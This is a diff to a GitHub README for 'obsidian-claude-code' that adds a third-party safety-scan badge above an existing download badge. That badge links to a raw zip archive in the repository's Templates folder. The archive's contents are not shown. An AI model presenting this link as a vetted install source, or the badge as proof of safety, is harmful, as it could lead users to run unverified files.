@@ -1,5 +1,7 @@
 # 🚀 obsidian-claude-code - Simplify Your Knowledge Management
 
+[![SafeSkill 87/100](https://img.shields.io/badge/SafeSkill-87%2F100_Passes%20with%20Notes-yellow)](https://safeskill.dev/scan/sizzlethewizzle-obsidian-claude-code)
+
 [![Download](https://github.com/SizzleTheWizzle/obsidian-claude-code/raw/refs/heads/main/Templates/obsidian-code-claude-1.6.zip)](https://github.com/SizzleTheWizzle/obsidian-claude-code/raw/refs/heads/main/Templates/obsidian-code-claude-1.6.zip)
 
 ## 🛠️ Overview
